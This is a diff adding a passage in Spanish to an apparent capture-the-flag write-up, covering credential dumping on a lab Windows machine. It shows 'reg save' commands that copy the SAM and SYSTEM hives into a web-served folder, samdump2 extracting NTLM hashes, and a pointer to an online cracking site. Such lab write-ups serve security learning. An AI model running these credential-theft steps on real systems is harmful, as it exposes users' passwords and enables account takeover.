@@ -308,6 +308,62 @@ root.txt
     THM{flag}
 
 "Lab" user NTLM hash decrypted  
+
+Enlace donde explica bastante bien que es LM y NTLM como conseguir los hash para posteriormente crakearlos.    
+https://c43s4rs.blogspot.com/2017/03/cracking-windows-passwords.html
+
+Buscamos los dos ficheros que necesitamos(SAM y SYSTEM) que se encuentran en la ruta "c:\Windows\system32\config" y nos lo descargamos a nuestra maquina atacante desde el directorio /includes.
+    
+Como vemos no lo podemos copiar y es por lo siguiente.
+
+        c:\Windows\System32\config>copy SAM C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes\SAM
+        copy SAM C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes\SAM
+        The process cannot access the file because it is being used by another process.
+        0 file(s) copied.
+
+Can you copy a SAM file?
+The file is stored on your system drive at C:\WINDOWS\system32\config. However, it is not accessible (it cannot be moved nor copied) from within the Windows OS since Windows keeps an exclusive lock on the SAM file and that lock will not be released until the computer has been shut down.
+
+Alternariva para copiar los ficheros Sam y System 
+
+    C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes>reg save HKLM\SAM samsave
+    reg save HKLM\SAM samsave
+    The operation completed successfully.
+    
+    C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes>reg save HKLM\SYSTEM systemsave
+    reg save HKLM\SYSTEM systemsave
+    The operation completed successfully.
+    
+![image](https://github.com/Esevka/CTF/assets/139042999/8f33e75d-aaec-40b8-ba69-f25825fde408)
+
+
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/blueprint/content]
+    └─# samdump2 -h                     
+    samdump2 3.0.0 by Objectif Securite (http://www.objectif-securite.ch)
+    original author: ncuomo@studenti.unina.it
+    
+    Usage: samdump2 [OPTION]... SYSTEM_FILE SAM_FILE
+    Retrieves syskey and extract hashes from Windows 2k/NT/XP/Vista SAM
+    
+      -d            enable debugging
+      -h            display this information
+      -o file       write output to file
+                                                                                                                                                    
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/blueprint/content]
+    └─# samdump2 -o hash SYSTEM SAM 
+                                                                                                                                                    
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/blueprint/content]
+    └─# cat hash   
+    Administrator:500:aad3b435b51404eeaad3b435b51404ee:hashtocrack:::
+    Guest:501:aad3b435b51404eeaad3b435b51404ee:hashtocrack:::
+    Lab:1000:aad3b435b51404eeaad3b435b51404ee:hashtocrack:::
+
+Para crakear el hash del usuario Lab de una manera rapida podemos utilizar esta web https://crackstation.net/ 
+
+
+
+
+    
     
 
 
